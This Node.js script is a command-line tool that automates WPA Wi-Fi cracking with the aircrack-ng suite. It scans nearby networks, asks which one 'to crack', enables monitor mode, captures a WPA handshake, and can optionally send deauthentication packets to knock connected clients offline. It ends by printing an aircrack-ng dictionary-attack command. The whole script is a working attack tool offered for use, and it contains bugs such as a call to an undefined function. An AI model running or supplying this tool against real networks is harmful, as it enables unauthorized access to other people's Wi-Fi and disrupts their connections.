#!/usr/bin/env nodejs

// var <- this makes the variables inaccessible from some functions (?)
  wfscan = require('node-wifiscanner'),
  readline = require('readline'),
  command_exists = require('command-exists'),
  proc = require('child_process'),
  argv = require('minimist')(process.argv.slice(2)),
  rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });


function fatal_error(msg) {
  console.log('[ERROR] '+msg);
  process.exit(1);
}

function text_between(str, prefix, suffix) {
  var a = str.indexOf(prefix);
  if (a < 0) return false;
  str = str.substr(a+prefix.length);
  a = str.indexOf(suffix);
  if (a < 0) return false;
  return str.substr(0, a);
}

function init() {
  var check = function(cmd) {
    command_exists(cmd, function(err, exists) {
      if (!exists)
        fatal_error('Cannot find command "'+cmd+'"');
    });
  };
  check('airmon-ng');
  check('airodump-ng');
  check('aireplay-ng');

  // Timeout to yield for the check callbacks
  setTimeout(function() {
    console.log('Scanning wifi...');
    wfscan.scan(select_wifi);
  });
}

function select_wifi(err, wifi_list) {

  if (err)
    fatal_error('Cannot scan wifi: ' + err);

  if (wifi_list.length == 0)
    fatal_error('No wifi found, try repeating the command or using the --reset command');

  for (var i in wifi_list) {
    console.log('['+i+'] '+wifi_list[i].mac+' - '+wifi_list[i].ssid+ ' ('+wifi_list[i].signal_level+')');
  }

  rl.question('Insert the number of the wifi to crack:\n', function(wifi) {
    wifi = parseInt(wifi);
    if (!(wifi in wifi_list)) {
      console.log('Invalid number.');
      scan_wifi();
    } else {
      crack_wifi(wifi_list[wifi]);
    }
  })
}

function crack_wifi(wifi) {
  var exec = function(cmd, callback) {
    return proc.exec(cmd, function(err, stdout, stderr) {
      if (err) fatal_error(cmd+': '+err);
      callback && callback(stdout, stderr);
    });
  }

  var disable_netman = function() {
    console.log('Disabling network-manager service...');
    proc.execSync('/etc/init.d/network-manager stop');
  }


  var enable_monitor = function(callback) {
    console.log('Enabling monitor interface...');
    exec('airmon-ng start wlan0 '+wifi.channel, function(stdout, stderr) {
      if (stderr.length > 0) console.log(stderr);
      var iface = text_between(stdout, '(monitor mode enabled on ', ')');
      callback && callback(iface);
    });
  }


  var listen = function(iface) {
    console.log('Listening using interface '+iface+'...');
    var file = 'psk_'+wifi.mac;

    proc.execSync('rm -f '+file+'*');
    var child = proc.spawn('airodump-ng', ['--ivs', '-c', wifi.channel,
        '--bssid', wifi.mac, '-w', file, '--update', '4', iface]);


    child.stderr.on('data', function(data) {
      data = data.toString();
      if (data.indexOf('WPA handshake') < 0) {

        if (settings.deauth) {
          var offset, chunk = data;
          var mac_re = '(([A-Fa-f0-9]{2}[:]){5}[A-Fa-f0-9]{2})';
          while ((offset = chunk.search(mac_re+'  '+mac_re)) >= 0) {
            chunk = chunk.substr(offset+19);
            var target = chunk.substr(0, 17);
            console.log('Sending deauth packets to '+target);
            try {
              proc.execSync('aireplay-ng -0 1 -a '+wifi.mac+' -c '+target+' '
                  +iface, {timeout: 10000});
            } catch(e) {}
          }
        }
        return;
      }
      child.kill();
      console.log('Captured handshake!');
      reset();
      console.log('Done. You have to manually proceed and crack the handshake '
          +'stored in '+file+' (es. aircrack-ng -w password.lst -b '+wifi.mac
          +' '+file+'-01.ivs)')
      process.exit(0);
    });
  }

  disable_netman();
  enable_monitor(listen);

}

function reset() {
  console.log('Disabling monitor interfaces...');
  for (var i = 0; i < 20; i++) // TODO just shutdown open interfaces
    proc.execSync('airmon-ng stop mon'+i);

  console.log('Enabling network-manager service...');
  proc.execSync('/etc/init.d/network-manager restart');
}

var settings = {
  iface: 'wlan0',
  deauth: true
}

// Read parameters
if ('i' in argv) settings.iface = argv.I;
settings.deauth = argv.deauth || argv.d;

if (argv.reset) {
  reset();
  process.exit(0);
}
if (argv.help || argv.H) {
  console.log('Usage: airtool flags <command>');
  console.log('  Flags:');
  console.log('    -i interface: interface on which activate airmon (default wlan0)');
  console.log('    -d, --deauth: enables active attack: deauthenticate clients to force a new handshake');
  console.log('  Commands:');
  console.log('    --reset: to use in case of errors/interruption of the process, removes monitor interfaces and (re)starts the network-manager');
  console.log('    --help: display this help');
  process.exit(0);
}

process.on('SIGINT', function() {
  reset();
  process.exit(1);
});

init();
